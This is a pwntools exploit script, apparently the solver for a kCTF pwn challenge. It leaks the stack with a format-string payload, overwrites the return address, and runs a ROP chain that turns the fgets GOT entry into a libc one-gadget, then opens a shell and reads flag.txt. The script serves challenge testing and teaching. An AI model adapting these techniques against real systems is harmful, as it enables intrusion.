#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes
from pwn import *

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

print(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

conn = r
context.binary = elf = ELF("/home/user/vuln")
libc = ELF("/home/user/libc-2.31.so")

conn.recvuntil(b"0x")
stack = int(conn.recv(12), 16)
info("stack @ " + hex(stack))
conn.recvuntil(b": ")

main = elf.sym.vuln+0x39
payload = b""
payload += f"%10${256+8+1}c%14$s%10$c%10$c%11$c%12$c%13$c".ljust(48, "\0").encode() # 5-10, 10 is null
payload += bytes([p64(main)[0]]) + b"aaaaaaa" # 11
payload += bytes([p64(main)[1]]) + b"aaaaaaa" # 12
payload += bytes([p64(main)[2]]) + b"aaaaaaa" # 13
payload += p64(stack+256+8+1) # canary, 14
conn.sendline(payload)

rop = ROP(elf)
payload = b"a"*128
# rop chain, 8 words (48 bytes)
pop = 0x40136a # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
add = 0x4011dc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(pop)
payload += p64(0xe3afe-libc.sym.fgets) # rbx
payload += p64(elf.got.fgets+0x3d) # rbp
payload += p64(0) # r12
payload += p64(0) # r13
payload += p64(stack + 0x90 - 0x8) # r14, rbp for initial stack pivot
payload += p64(0) # r15
payload += p64(add)
payload += p64(elf.sym.fgets) # trigger one gadget
payload = payload.ljust(216, b"a")
payload += p64(rop.find_gadget(["leave", "ret"])[0]) # initial stack pivot
conn.sendline(payload)

conn.sendline(b"cat flag.txt")

if b"idek" in conn.recvline():
  exit(0)
exit(1)
